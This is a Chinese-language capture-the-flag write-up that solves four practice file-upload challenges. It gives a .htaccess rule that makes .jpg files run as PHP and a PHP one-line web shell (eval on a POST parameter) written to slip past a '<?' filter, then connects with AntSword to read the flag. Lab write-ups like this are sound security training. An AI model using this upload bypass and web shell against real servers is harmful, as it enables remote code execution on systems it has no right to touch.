# 文件上传

## [SWPUCTF 2021 新生赛]easyupload1.0
>url:https://www.nssctf.cn/problem/388

![alt text](image-339.png)
打开题目叫我们上传.jpg文件
![alt text](image-340.png)
上传成功直接显示路径了，用蚁剑连接一下
直接连接没用，改一下后缀
![alt text](image-342.png)
然后连接成功
![alt text](image-341.png)
直接拿flag
![alt text](image-343.png)



## [SWPUCTF 2021 新生赛]easyupload3.0
>url:https://www.nssctf.cn/problem/436
>.hatccess,mime绕过

![alt text](image-344.png)
先传给jpg看看
![alt text](image-345.png)
上传成功但是连接不了
![alt text](image-346.png)
看到提示配合文件使用，说明这里应该要用.hatccess **.htaccess 可以“强行让图片当 PHP 执行”**
```
把上传包改成：
filename=".htaccess"
Content-Type: image/jpeg

文件内容：
AddType application/x-httpd-php .jpg
```
直接上传
![alt text](image-347.png)
然后重新上传一句话木马
![alt text](image-349.png)
连接成功
![alt text](image-348.png)
然后就拿到flag了
![alt text](image-350.png)



## [GXYCTF 2019]BabyUpload
>url:https://www.nssctf.cn/problem/1094
>知识点：.htaccess

直接上传一句话木马没有
![alt text](image-333.png)
经过不断上传东西发现会出现三种回复
1. 后缀名不能有ph！
2. 上传类型也太露骨了吧！
3. 诶，别蒙我啊，这标志明显还是php啊，这是**上传内容重含有<?**
所以重新构造一句话木马
```php
<script language="php">eval($_POST[x]);</script>
```
它不包含 <?,过滤检测不到,Apache 仍执行
把上传包改成：
```
filename=".htaccess"
Content-Type: image/jpeg
```
内容改为：
```
AddType application/x-httpd-php .jpg
```
![alt text](image-335.png)
构造第二个请求：
```
filename="shell.jpg"    Content-Type: image/jpeg

内容：
<script language="php">eval($_POST[x]);</script>

```
![alt text](image-336.png)
得到上传路径
```payload
var/www/html/upload/8f8f474cd76395198dd070b053961f3e/1.jpg succesfully uploaded!
```
然后蚁剑连接
![alt text](image-337.png)
最后找到flag
![alt text](image-338.png)


## [MoeCTF 2022]what are y0u uploading？
>url:https://www.nssctf.cn/problem/3351

打开题目直接上传一个图片木马
![alt text](image-351.png)

根据提示上传一个f1ag.php 
修改成f1ag.php之后直接就把flag给出来了
![alt text](image-352.png)